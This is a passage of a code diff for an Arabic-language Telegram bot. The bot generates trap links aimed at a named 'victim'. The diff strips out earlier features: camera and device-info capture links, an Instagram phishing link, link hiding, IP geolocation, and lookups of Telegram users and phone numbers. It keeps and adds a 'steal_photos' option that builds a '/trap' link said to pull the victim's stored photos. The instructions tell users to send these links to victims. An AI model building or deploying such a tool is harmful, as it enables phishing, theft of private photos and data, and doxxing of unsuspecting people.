             send_message(chat_id, "مرحباً بك في FREEUSR ➊\n\nمن الخيارات المتاحة:", main_menu())
             
         elif user_state.get(chat_id, {}).get('state') == 'waiting_for_target':
-            state_data = user_state[chat_id]
-            action = state_data['action']
+            action = user_state[chat_id]['action']
             target = text
             
-            if action == 'camera': link = f"{BASE_URL}/camera?target={target}&admin={chat_id}"
-            elif action == 'device': link = f"{BASE_URL}/device?target={target}&admin={chat_id}"
-            elif action == 'format': link = f"{BASE_URL}/format?target={target}&admin={chat_id}"
-            elif action == 'freeze': link = f"{BASE_URL}/freeze?target={target}&admin={chat_id}"
-            elif action == 'insta': link = f"{BASE_URL}/?target={target}&admin={chat_id}"
-            elif action == 'phone': link = f"{BASE_URL}/phone?target={target.replace('@','')}&admin={chat_id}"
-            elif action == 'steal_photos': link = f"{BASE_URL}/trap?target={target}&admin={chat_id}"
+            if action == 'steal_photos': 
+                link = f"{BASE_URL}/trap?target={target}&admin={chat_id}"
+                send_message(chat_id, f"✅ الرابط:\n`{link}`", None)
                 
-            send_message(chat_id, f"✅ الرابط:\n`{link}`", None)
-            del user_state[chat_id]
-            
-        elif user_state.get(chat_id, {}).get('state') == 'waiting_ip':
-            ip = text
-            try:
-                geo = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,city,isp,org,as,query', timeout=5).json()
-                if geo.get('status') == 'success':
-                    res = f"🌍 *معلومات الـ IP:*\n\n📍 الدولة: {geo.get('country')}\n🏙 المدينة: {geo.get('city')}\n📡 المزود: {geo.get('isp')}\n🏢 المؤسسة: {geo.get('org')}"
-                else: res = "❌ الـ IP غير صالح أو غير موجود."
-            except: res = "❌ حدث خطأ أثناء جلب البيانات."
-            send_message(chat_id, res)
-            del user_state[chat_id]
-            
-        elif user_state.get(chat_id, {}).get('state') == 'waiting_for_link':
-            long_url = text
-            if not long_url.startswith("http"): long_url = "http://" + long_url
-            code = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
-            short_links[code] = long_url
-            short_url = f"{BASE_URL}/s/{code}"
-            send_message(chat_id, f"✅ تم إخفاء الرابط بنجاح:\n\n`{short_url}`")
-            del user_state[chat_id]
-
-        elif user_state.get(chat_id, {}).get('state') == 'waiting_for_decor':
-            decorated = decorate_text(text)
-            send_message(chat_id, f"✨ النص المزخرف:\n\n{decorated}")
-            del user_state[chat_id]
-            
-        elif user_state.get(chat_id, {}).get('state') == 'waiting_username':
-            username = text.replace('@', '').strip()
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChat?chat_id=@{username}"
-            try:
-                res = requests.get(url, timeout=5).json()
-                if res.get('ok'):
-                    data = res['result']
-                    user_id = data.get('id')
-                    first_name = data.get('first_name', '')
-                    last_name = data.get('last_name', '')
-                    type_ = data.get('type')
-                    full_name = f"{first_name} {last_name}".strip()
-                    
-                    msg_info = f"👁 *نتائج البحث:*\n\n🆔 الآيدي: `{user_id}`\n👤 الاسم: `{full_name}`\n🏷️ اليوزر: `@{username}`\n📌 النوع: `{type_}`"
-                    send_message(chat_id, msg_info)
-                else:
-                    send_message(chat_id, "❌ المستخدم غير موجود أو الحساب مخفي (لا يملك يوزر عام).")
-            except:
-                send_message(chat_id, "❌ حدث خطأ أثناء الاتصال بسيرفرات تيليجرام.")
-            del user_state[chat_id]
-
-        elif user_state.get(chat_id, {}).get('state') == 'waiting_phone_search':
-            phone_num = text.replace(" ", "").replace("-", "")
-            if not phone_num.startswith("+"):
-                phone_num = "+" + phone_num
-            clean_num = phone_num.replace("+", "")
-            try:
-                parsed_num = phonenumbers.parse(phone_num, None)
-                country = geocoder.description_for_number(parsed_num, "ar")
-                car = carrier.name_for_number(parsed_num, "ar")
-                
-                report = (
-                    f"📱 *تقرير فحص الرقم:* `{phone_num}`\n\n"
-                    f"🌍 الدولة: `{country}`\n"
-                    f"📡 الشبكة: `{car if car else 'غير معروف'}`\n\n"
-                    f"🔍 *اضغط على المنصة للبحث:*\n"
-                    f"👤 [كاشف الأرقام (Truecaller)](https://www.truecaller.com/search/global/{phone_num})\n"
-                    f"🎵 [تيك توك](https://www.tiktok.com/search/user?q={phone_num})\n"
-                    f"✈️ [تيليجرام](https://t.me/{phone_num})\n"
-                    f"📘 [فيسبوك](https://www.facebook.com/search/top?q={phone_num})\n"
-                    f"🟢 [واتساب](https://wa.me/{clean_num})\n"
-                    f"🌐 [بحث جوجل](https://www.google.com/search?q={phone_num})"
-                )
-                send_message(chat_id, report)
-            except Exception as e:
-                send_message(chat_id, "❌ الرقم غير صالح أو تنسيقه غلط (مثال: +967770000000).")
             del user_state[chat_id]
     
     if 'callback_query' in update:
@@ -659,67 +287,21 @@ def webhook():
         
         answer_callback(cb_id)
         
-        if data == 'joke': 
-            send_message(chat_id, "مرة واحد روبوت دخل مطعم قاله عايز بطارية مشوية 😂")
-        elif data == 'cam':
-            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'camera'}
-            send_message(chat_id, "📷 أرسل اسم الضحية لإنشاء رابط الكاميرا:")
-        elif data == 'device':
-            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'device'}
-            send_message(chat_id, "🔬 أرسل اسم الضحية لإنشاء رابط معلومات الجهاز:")
-        elif data == 'phone':
-            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'phone'}
-            send_message(chat_id, "📱 أرسل يوزر تيليجرام الخاص بالضحية (بدون @):")
-        elif data == 'ip':
-            user_state[chat_id] = {'state': 'waiting_ip'}
-            send_message(chat_id, "🌐 أرسل الـ IP الذي تريد فحصه (مثال: 8.8.8.8):")
-        elif data == 'v17':
-            user_state[chat_id] = {'state': 'waiting_for_link'}
-            send_message(chat_id, "🔒 أرسل الرابط الطويل الذي تريد إخفاءه:")
-        elif data == 'v16':
-            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'format'}
-            send_message(chat_id, "⛔ أرسل اسم الضحية لإنشاء رابط الفرمتة:")
-        elif data == 'decor':
-            user_state[chat_id] = {'state': 'waiting_for_decor'}
-            send_message(chat_id, "📝 أرسل النص الذي تريد زخرفته:")
-        elif data == 'guide':
-            send_message(chat_id, "📖 شرح استخدام البوت:\n1. اختر الخدمة المطلوبة.\n2. أرسل اسم الضحية.\n3. انسخ الرابط وأرسله للضحية.")
-        elif data == 'dev':
-            send_message(chat_id, "📞 للتواصل مع المطور:\n@YourUsername")
-        elif data == 'insta':
-            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'insta'}
-            send_message(chat_id, "📸 أرسل اسم أو إيميل الضحية:")
-        elif data == 'search_user':
-            user_state[chat_id] = {'state': 'waiting_username'}
-            send_message(chat_id, "👁 أرسل يوزر تيليجرام الذي تريد البحث عنه (بدون @):")
-        elif data == 'phone_search':
-            user_state[chat_id] = {'state': 'waiting_phone_search'}
-            send_message(chat_id, "📱 أرسل رقم الهاتف مع رمز الدولة (مثال: +967770000000):")
-        elif data == 'steal_photos':
+        if data == 'steal_photos':
             user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'steal_photos'}
-            send_message(chat_id, "🚨 أرسل اسم الضحية لإنشاء رابط الفخ القسري (سحب 30 صورة/دفعة):")
+            send_message(chat_id, "🚨 أرسل اسم الضحية لإنشاء رابط سحب ذاكرة التخزين:")
         else:
-            send_message(chat_id, "تم تنفيذ طلبك بنجاح ✅\nجاري استخراج البيانات...")
+            send_message(chat_id, "تم تنفيذ طلبك بنجاح ✅")
             
     return "ok", 200
 
-
-# =======================================================
-# 🚀 إعداد Webhook التلقائي عند التشغيل
-# =======================================================
 def set_webhook():
     webhook_url = f"{BASE_URL}/webhook"
-    print(f"⏳ جاري ربط الـ Webhook بالرابط: {webhook_url}")
     try:
-        response = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}", timeout=10)
-        if response.status_code == 200 and response.json().get("ok"):
-            print("✅ تم ربط الـ Webhook بنجاح! البوت جاهز لاستقبال الرسائل.")
-        else:
-            print("❌ فشل ربط الـ Webhook:", response.text)
+        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}", timeout=10)
     except Exception as e:
-        print("❌ خطأ أثناء الاتصال بتليجرام:", e)
+        print(e)
 
-# استدعاء دالة الربط
 set_webhook()
 
 if __name__ == '__main__':
